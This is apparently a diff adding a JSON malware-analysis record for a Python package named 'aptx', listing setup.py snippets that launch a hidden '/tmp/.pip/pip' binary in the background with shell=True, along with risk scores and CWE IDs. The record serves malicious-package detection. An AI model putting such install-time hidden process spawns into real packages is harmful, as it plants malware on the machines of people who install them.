@@ -1,0 +1,36 @@
+{
+  "package_metadata": {
+    "name": "aptx",
+    "version": "0.2",
+    "author_email": ""
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_endpoints": [],
+    "process_spawns": [
+      "\"/tmp/.pip/pip autoupdate\" &",
+      "\"/tmp/.pip/pip cleanup\" &"
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "setup.py",
+        "code_snippet": "subprocess.run(\"/tmp/.pip/pip autoupdate\" &, shell=True)\n"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "subprocess.run(\"/tmp/.pip/pip cleanup\" &, shell=True)\n"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.85,
+    "risk_score": 0.9,
+    "confidence": 0.95,
+    "cwe_ids": [
+      "CWE-78",
+      "CWE-502"
+    ]
+  }
+}
